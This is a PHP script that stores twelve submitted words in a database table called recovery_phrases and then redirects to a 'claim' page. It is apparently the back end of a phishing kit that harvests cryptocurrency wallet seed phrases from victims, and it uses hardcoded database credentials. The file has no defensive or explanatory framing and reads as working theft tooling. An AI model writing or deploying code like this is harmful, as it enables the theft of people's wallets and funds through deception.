<?php
$servername = "localhost";
$username = "codeak";
$password = "5334";
$dbname = "analos_DB";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $word1 = $conn->real_escape_string($_POST['word1']);
    $word2 = $conn->real_escape_string($_POST['word2']);
    $word3 = $conn->real_escape_string($_POST['word3']);
    $word4 = $conn->real_escape_string($_POST['word4']);
    $word5 = $conn->real_escape_string($_POST['word5']);
    $word6 = $conn->real_escape_string($_POST['word6']);
    $word7 = $conn->real_escape_string($_POST['word7']);
    $word8 = $conn->real_escape_string($_POST['word8']);
    $word9 = $conn->real_escape_string($_POST['word9']);
    $word10 = $conn->real_escape_string($_POST['word10']);
    $word11 = $conn->real_escape_string($_POST['word11']);
    $word12 = $conn->real_escape_string($_POST['word12']);

    $sql = "INSERT INTO recovery_phrases (word1, word2, word3, word4, word5, word6, word7, word8, word9, word10, word11, word12)
            VALUES ('$word1', '$word2', '$word3', '$word4', '$word5', '$word6', '$word7', '$word8', '$word9', '$word10', '$word11', '$word12')";

    if ($conn->query($sql) === TRUE) {
        echo "New record created successfully";
        header("Location: claim.html");
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
} else {
    echo "Invalid request method.";
}
?>
